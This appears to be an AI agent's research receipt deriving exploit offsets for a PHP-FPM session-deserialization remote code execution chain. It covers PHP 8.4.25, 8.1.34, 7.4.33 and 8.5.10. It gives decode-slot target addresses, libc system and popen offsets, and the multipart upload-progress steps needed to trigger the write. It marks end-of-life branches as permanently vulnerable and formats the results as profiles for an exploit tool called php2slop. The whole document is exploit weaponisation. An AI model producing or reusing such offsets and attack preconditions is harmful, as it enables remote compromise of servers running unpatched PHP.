# G2 serializer decode RCE offsets, vulnerable PHP branches

UTC stamp: 20261022T000500Z (dir veroff_20261021_215718)
Scope: static derivation only, no lab service, no shared instance, no HTTP exchange.
Style: terse technical English.

## 0. Result

G2 offsets derived for PHP 8.4.25, 8.1.34, 7.4.33 on freshly built non-PIE FPM
binaries, plus the 8.5.10 reference already proven live. All four are ET_EXEC
and the `ps_serializers[2].decode` word is 16-byte aligned, so the measured G2
write shape transfers unchanged. 8.4.27 and 8.5.12 reset
`BG(unserialize)` before `sapi_activate`, which kills the stale chain.
libc `system` is not imported by any build, so a libc base leak is still
required; the in-binary `zend_eval_string` lane is signature-broken (rsi is
the session length, not a zval pointer).

| branch | binary | md5 | PIE | decode target A | PS(serializer) | eval / system | align | leak need |
|---|---|---|---|---|---|---|---|---|
| 8.4.25 | build/php-8.4.25/sapi/fpm/php-fpm | 95cca39b95cb5f2d5b897fc5cc6e8628 | ET_EXEC | 0xe01180 | 0xe03a60 (ps_globals+0x160) | zend_eval_string 0x873790, zend_eval_stringl 0x873541, libc system 0x53090 | 16 | libc base only |
| 8.1.34 | build/php-8.1.34/sapi/fpm/php-fpm | 6ea2762ef76f44674805736e19570bb1 | ET_EXEC | 0xe01140 | 0xe02fb0 (ps_globals+0x130) | 0x7ec4d5, 0x7ec27f, libc system 0x53090 | 16 | libc base only |
| 7.4.33 | build/php-7.4.33/sapi/fpm/php-fpm | 9c7b5c2287fdebe6b3324223034715da | ET_EXEC | 0xe010a0 | 0xe02df0 (ps_globals+0x130) | 0x7cd5ab, 0x7cd343, libc system 0x53090 | 16 | libc base only |
| 8.5.10 ref | install_plainpie/sbin/php-fpm | 825470df6b9fa7d0178a1a9bcf4ce6dc | ET_EXEC | 0x14c1b60 | 0x14c6160 (ps_globals+0x160) | 0x9cfd10, 0x9cfac1, libc system 0x53090 | 16 | libc base only |

`A` is `ps_serializers + 2*24 + 0x10`, the active `php_binary` decode slot.
All four builds have the serializer order `php_serialize, php, php_binary`
(session.c: PS_SERIALIZER_ENTRY lines 1160/1161/1162 in 8.4.25, 1034/1035/1036
in 8.1.34, 1030/1031/1032 in 7.4.33). Entry 3 is the NULL terminator, so the
second zval of the G2 write lands on `entry3.name` at `A+0x10`, and
`php_session_normalize_vars` restores the terminator.

## 1. Binaries

No 8.4.25, 8.1.34 or 7.4.33 FPM binary existed in the environment. The V5
writeport receipt had 7.4.33 CLI only (`/tmp/opencode/php7lab/php-7.4.33/sapi/cli/php`,
no FPM), and no 8.4 or 8.1 build existed at all. Three FPM binaries were built
in this receipt dir with the same shape as the 8.5.10 non-PIE reference:

```
CFLAGS='-g -O1 -fno-omit-frame-pointer -fno-pie' LDFLAGS='-no-pie' \
./configure --disable-all --enable-fpm --enable-session --without-pear
make -j3
make LDFLAGS='-no-pie' sapi/fpm/php-fpm   # relink for 8.1.34 and 7.4.33
```

Sources: `/home/davide/ailocal/php/diff_8425_8510/php-8.4.25.tar.xz`,
`https://www.php.net/distributions/php-8.1.34.tar.xz`,
`/tmp/opencode/php7lab/php74.tar.gz`.

| version | build id | type | size | banner |
|---|---|---|---|---|
| 8.4.25 | ff6fee90a6574c7cf4e89a91ad76619ff03b13b2 | EXEC | 28342408 | PHP 8.4.25 (fpm-fcgi) (NTS) built Oct 21 2026 23:59:26 |
| 8.1.34 | 5b776429a95eebc43be24e001314e19e5fc4e1fd | EXEC | 25797456 | PHP 8.1.34 (fpm-fcgi) built Oct 21 2026 23:59:43 |
| 7.4.33 | 1f996193caece78f0f794fb83c3c60707a068ce1 | EXEC | 22764672 | PHP 7.4.33 (fpm-fcgi) built Oct 21 2026 23:59:33 |
| 8.5.10 | 3d459b79bdd7d0fb8181e21fec72783062e6f6d9 | EXEC | 42900672 | PHP 8.5.10 (fpm-fcgi) |

Addresses are build specific: the 8.5.10 table is 0x14c1b20 based while the
minimal builds are 0xe0xxxx based. php2slop must key on md5/build id, not on
version alone.

## 2. Offset evidence

`ps_serializers` and `ps_globals` are local symbols in every build (`nm -a`).
`PS(serializer)` offset comes from DWARF `ptype /o php_ps_globals`.

| quantity | 8.4.25 | 8.1.34 | 7.4.33 | 8.5.10 |
|---|---|---|---|---|
| ps_serializers | 0xe01140 | 0xe01100 | 0xe01060 | 0x14c1b20 |
| ps_globals | 0xe03900 | 0xe02e80 | 0xe02cc0 | 0x14c6000 |
| PS(serializer) offset | 0x160 | 0x130 | 0x130 | 0x160 |
| decode target A | 0xe01180 | 0xe01140 | 0xe010a0 | 0x14c1b60 |
| php_binary decode fn | 0x703cf4 | 0x6eb0d3 | 0x6d5c7f | 0x83e04f |
| php_session_decode | 0x7037b4 | 0x6eac79 | 0x6d582a | 0x83db0f |
| `call *0x10(%rax)` | 0x70380b | 0x6eac96 | 0x6d5847 | 0x83db66 |
| zend_eval_string | 0x873790 | 0x7ec4d5 | 0x7cd5ab | 0x9cfd10 |
| zend_eval_stringl | 0x873541 | 0x7ec27f | 0x7cd343 | 0x9cfac1 |

Call site shape, same in all four:

```
mov  <PS(serializer)>,%rax        # 8.4.25: e03a60, 8.1.34: e02fb0, 7.4.33: e02df0
mov  0x10(%rdi),%rsi              # data->len
add  $0x18,%rdi                   # data->val   (8.4.25 uses lea 0x18(%rax))
call *0x10(%rax)                  # ps_serializer->decode
```

The array contents confirm the entry index rather than trusting the order:

```
8.4.25 .data e01170: name 0xa05c4d, encode 0x703a3c, decode 0x703cf4
8.1.34 .data e01130: name 0xa232a5, encode 0x6eaecb, decode 0x6eb0d3
7.4.33 .data e01090: name 0xa21251, encode 0x6d5a77, decode 0x6d5c7f
8.5.10 .data 14c1b50: name 0xe0b27d, encode 0x83dd97, decode 0x83e04f
```

Decode targets mod 16 are 0 in every case; `ps_serializers` itself is 0x20 or
0x40 aligned in all four builds. The three decode slots are at
`ps_serializers+0x10`, `+0x28`, `+0x40`; only `+0x40` (entry 2, php_binary) is
16-byte aligned, so it is the only slot the two-zval G2 write can hit without
clobbering a neighbour. Absolute slots:

| version | entry0 decode | entry1 decode | entry2 decode |
|---|---|---|---|
| 8.4.25 | 0xe01150 | 0xe01168 | 0xe01180 |
| 8.1.34 | 0xe01110 | 0xe01128 | 0xe01140 |
| 7.4.33 | 0xe01070 | 0xe01088 | 0xe010a0 |
| 8.5.10 | 0x14c1b30 | 0x14c1b48 | 0x14c1b60 |

When `session.serialize_handler=php_binary`, `PS(serializer)` caches
`ps_serializers+0x30`, so the active decode word is exactly A above.

libc used by all rows: `/lib/x86_64-linux-gnu/libc.so.6`,
build id 5e5b51f4c39af9ac589408c1dc432ba390a273cc,
`system` 0x53090, `popen` 0x7ff90. `system` is not imported: each binary has
`popen`, `execvp`, and (8.4/8.5) `posix_spawn` undefined symbols only.

## 3. Fix confirmation

8.4.27 release tarball, sha256 `dcf93923b0e38e0d5252b25b796520b5a47761a08b3488b6d0b5d1115764d3f0`,
matching the 8.4.27 release record (`date 21 Oct 2026`):

```
main/main.c:1869        php_basic_early_rinit();
main/main.c:1870        sapi_activate();
ext/standard/basic_functions.c:491  PHPAPI void php_basic_early_rinit(void)
ext/standard/basic_functions.c:498      memset(&BG(unserialize), 0, sizeof(BG(unserialize)));
```

8.5.12 has the same shape: `main/main.c:1939` call before `sapi_activate` at
1940, function at `basic_functions.c:492`. 8.4.25 has no
`php_basic_early_rinit` at all (grep over main/ and basic_functions.c empty),
and 8.4.25 session.c has no `incomplete_classes_only` or `in_rfc1867_update`;
8.4.27 adds both (`session.c:973-982`), so 8.4.25 additionally runs full
unserialize semantics before RINIT.

Producer precondition per branch:

| branch | precondition |
|---|---|
| 8.4.25 | upload progress on (default), cookie + `PHP_SESSION_UPLOAD_PROGRESS` field in a multipart POST; first request must bail out inside the pre-RINIT `php_session_initialize` decode (OOM or error handler) leaving `BG(unserialize).level>0`; next multipart request reclaims P and B0 with the session record and hits the second decode. Attacker must control the session file bytes (own save_path or app-written session). Sites: `php_session_rfc1867_update` session.c:3169, `php_session_initialize` 419, decode call 502, `php_session_decode` 274, dispatch 279. |
| 8.1.34 | identical shape; update session.c:2949, initialize 383, decode call 464, decode 245, dispatch 251. |
| 7.4.33 | identical shape; update session.c:3123, initialize 383, decode call 457, decode 245, dispatch 251. |
| 8.4.27, 8.5.12 | not reachable via this lane: `BG(unserialize)` is zeroed in `php_basic_early_rinit` before `sapi_activate`, so the stale level never survives into the progress callback. |

The fix does not remove the write primitive; it removes the stale global that
lets the attacker choose P and B0.

## 4. Branch notes

7.4.33 versus V5 (writeport receipt):

* `BG(unserialize).data` at `php_basic_globals+3520` (0xdc0) and `.level` at
  +3528, not +872/+880 as in 8.4/8.5.
* `php_unserialize_data` sizeof 8216, `entries` at 0x38, `used_slots` at 0x38,
  `next` at 0x40, `data[0]` at 0x48, `B0 - P = 0x3000` unchanged.
* `PS(serializer)` moves from 0x160 (8.x) to 0x130; `ps_globals` is
  `0xe02cc0`, so the cached pointer is at `0xe02df0`.
* The V5 write path used cli-server because no FPM existed; FPM now exists and
  the pre-RINIT lane applies, so the plant no longer needs the post-RINIT
  workaround forced by `php_cli_server.c:2189-2194`.
* Serializer table is static and writable (`.data`), 24-byte entries, entry 2
  decode at 0xe010a0. The G2 zval write reaches it with the same negative slot
  arithmetic (`used_slots + num > 255` has no lower bound in 7.4 either).

8.1.34: last 8.1 release, security only, dated 18 Dec 2025; the 8.1 branch is
end of life (supported_versions in the release record is 8.2 to 8.5), so this
code will not receive the 8.4.27/8.5.12 fix. Treat 8.1.34 as permanently
vulnerable, and note the 8.1.32 tree has the same `ps_serializers` order and
the same rfc1867 hook.

5.x caveat: do not reuse the 7.4/8.x geometry. In 5.6.40,
`php_unserialize_data` is `{first, last, first_dtor, last_dtor}` (php_var.h:43-48)
and dtor slots use `var_entries` with `zval *data[1024]` first, then
`long used_slots` at +0x2000 and `void *next` at +0x2008
(var_unserializer.c:36-39). The bound is equality `used_slots == VAR_ENTRIES_MAX`
(var_unserializer.c:115), not the `used_slots + num > MAX` test, and the dtor
slot for a negative index resolves before `data[0]`, not before the block
header. `BG(unserialize)` is a struct `{void *var_hash; unsigned level;}`
(basic_functions.h:212-215), not a pointer. The serializer struct and the
`decode(val, vallen)` call are the same 24-byte shape (php_session.h:200-204,
session.c:225), so a 5.x port is plausible but needs its own layout probe and
binary.

## 5. php2slop integration

Machine readable table in `g2_offsets.json`, ready to key `BINARY_PROFILES` by
md5. Suggested profile fields per build:

```
"g2": {"ps_serializers": ..., "ps_serializer_off": ..., "decode_target": ...,
       "decode_call_site": ..., "eval": ..., "eval_strl": ...,
       "libc_system": 0x53090, "libc_popen": 0x7ff90,
       "align16": true, "lane": "libc_leak_required",
       "producer": "rfc1867_pre_rinit_bailout_then_second_decode"}
```

Fragment also written as `php2slop_profiles_fragment.py`.

## 6. Blockers

1. Address lock to md5: the three minimal builds differ from packaged distro
   builds. Any reuse must verify md5 and the 24-byte array contents.
2. `system` is not imported by PHP-FPM, so the libc base leak is unavoidable
   for a `system` target even on ET_EXEC. ET_EXEC only fixes A.
3. `zend_eval_string` as decode target is blocked by ABI: the call site sets
   `rsi = ZSTR_LEN(data)` and `rdx` is not loaded from attacker data.
   `zend_eval_stringl` treats a non-NULL `retval_ptr` as a real zval and
   does `ZVAL_COPY_VALUE(retval_ptr, ...)` (zend_execute_API.c:1338-1380),
   so rsi = session length becomes a wild write. Only rsi = 0 would be safe,
   and that contradicts a nonzero payload.
4. `popen` and `execvp` PLT slots are present but take a second argument
   (mode, argv) that the decode call site does not control.
5. 8.4.27 and 8.5.12 are fixed for this lane; 8.1 and 7.4 are EOL and stay
   vulnerable. 5.x requires separate derivation (section 4).

## 7. Receipt

```
dir: /tmp/opencode/research/veroff_20261021_215718/
build/php-8.4.25/sapi/fpm/php-fpm   md5 95cca39b95cb5f2d5b897fc5cc6e8628  EXEC
build/php-8.1.34/sapi/fpm/php-fpm   md5 6ea2762ef76f44674805736e19570bb1  EXEC
build/php-7.4.33/sapi/fpm/php-fpm   md5 9c7b5c2287fdebe6b3324223034715da  EXEC
src8427/php-8.4.27.tar.xz           sha256 dcf93923b0e38e0d5252b25b796520b5a47761a08b3488b6d0b5d1115764d3f0
```

No process was started, no port bound, no request sent. Commands used:
`nm -a`, `objdump -d/-s`, `readelf -h/-n`, `gdb -batch -ex 'ptype /o php_ps_globals'`,
`grep` over the source trees. Build time 3 binaries, 8 cores, about 90 s.
